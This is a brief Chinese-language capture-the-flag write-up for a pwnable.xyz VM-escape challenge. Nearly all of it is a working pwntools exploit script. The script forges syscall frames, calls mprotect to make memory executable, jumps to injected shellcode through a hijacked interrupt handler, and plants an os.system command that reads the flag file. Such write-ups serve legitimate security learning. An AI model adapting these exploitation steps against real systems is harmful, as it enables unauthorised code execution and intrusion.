### 描述

发现做上一道题（AdultVM 2）时就是按照本题的思路去做得，所以很轻松就完成了



### 脚本

```python
from pwn import *

context(os='linux', arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']

p = remote('svc.pwnable.xyz', 30048)
# p = process('./userland')

kernel_addr = 0xFFFFFFFF81000000
kernel_stack = 0xFFFF8801FFFFF000 - 0x1000

note_addr = 0x4100380
note_sz = 40
memory_addr = 0x4100180


def editNote(ix, ct):
    p.sendlineafter(b'Exit\n', b'1')
    p.sendlineafter(b'id: ', str.encode(str(ix)))
    p.sendlineafter(b's: ', ct)


def showNote(ix):
    p.sendlineafter(b'Exit\n', b'2')
    p.sendlineafter(b'id: ', str.encode(str(ix)))


def syscall(rax, rdi, rsi, rdx):
    showNote(0)
    syscall_addr = 0x4000338
    payload = p64(rax) + p64(rdi) + p64(rsi) + p64(rdx) + p64(syscall_addr)
    p.send(payload)
    showNote(1)


def checkPayload(pl):
    if b'\n' in pl:
        error('no newline!')


shellcode = '''
    mov rax, 7
    mov rdi, {}
    mov rdx, 27
    mov rsi, {}
    push 0xFFFFFFFF8100013b
    ret
'''.format(memory_addr, memory_addr)
irq_handler_addr = 0x4100340 + 8
shellcode = p64(irq_handler_addr) + asm(shellcode)
checkPayload(shellcode)
print('shellcode', len(shellcode), shellcode)
editNote(0, b'os.system("cat /flag3.txt")')
for i in range(1, 8):
    editNote(i, b'1')
editNote(8, shellcode)

# 绕过'\n'读取限制
read_addr = 0x400000f
payload = b'a' * 8         # padding
payload += p64(note_addr + note_sz) + p64(note_sz) + \
    p64(0) + p64(0) + p64(read_addr)
checkPayload(payload)
editNote(9, payload)

# mem_protect
# .data段增加执行权限
rax = 10
rdi = 0x4100000
rsi = 0x100000
rdx = 7
syscall(rax, rdi, rsi, rdx)

# 执行shellcode
rax = 274858008       # jmp [0x??? + rax * 8] -> rip = node[8].node[0]
syscall(rax, 0, 0, 0)

p.interactive()

```

